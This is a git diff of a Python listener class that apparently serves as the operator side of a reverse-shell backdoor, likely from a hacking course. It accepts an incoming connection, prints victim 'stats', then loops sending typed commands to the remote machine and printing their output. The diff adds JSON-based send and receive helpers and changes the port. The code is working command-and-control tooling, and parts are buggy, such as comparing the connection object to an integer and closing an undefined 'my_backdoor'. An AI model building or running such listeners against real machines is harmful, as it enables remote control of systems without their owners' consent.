@@ -1,6 +1,6 @@
 
 import socket
-
+import json
 
 class Listener:
     def __init__(self, ip, port):
@@ -13,6 +13,7 @@ class Listener:
             print("[+] Waiting for incoming connections")
             self.connection, address = listener.accept()
             print("[+] Got a connection from" + str(address))
+
         except KeyboardInterrupt:
             print("[+] Detected CTRL + C.....Closing App....Please wait...")
             if self.connection > 2:
@@ -26,16 +27,37 @@ class Listener:
     def close_connection(self):
         self.connection.close()
 
+    def reliable_send(self, data):
+        json_data = json.dumps(data)
+        self.connection.send(json_data.encode())
+
+    def reliable_receive(self):
+        json_data = b""
+        while True:
+            try:    
+                json_data = json_data + self.connection.recv(1460)
+                return json.loads(json_data)
+            except ValueError:
+                continue
+
     def execute_remote_command(self, command):
-        self.connection.send(command.encode())
-        return self.connection.recv(1024)
+        #self.connection.send(command.encode())
+        self.reliable_send(command)
+        #return self.connection.recv(1024)
+        return self.reliable_receive()
 
     def run(self):
+        stats = self.reliable_receive()
+        print(stats)
         while True:
             try:
                 command = input(">> ")
                 result = self.execute_remote_command(command)
                 print(result)
+
+            except json.JSONDecodeError:
+                #print(receive_command)
+                pass
 
             except KeyboardInterrupt:
                 print("[+] Detected CTRL + C.....Closing App....Please wait...")
@@ -43,8 +65,7 @@ class Listener:
                 exit()
 
 # class end
-
-my_listener = Listener("127.0.0.1", 4462)
+my_listener = Listener("127.0.0.1", 4490)
 my_listener.run()
 my_backdoor.close_connection()
     
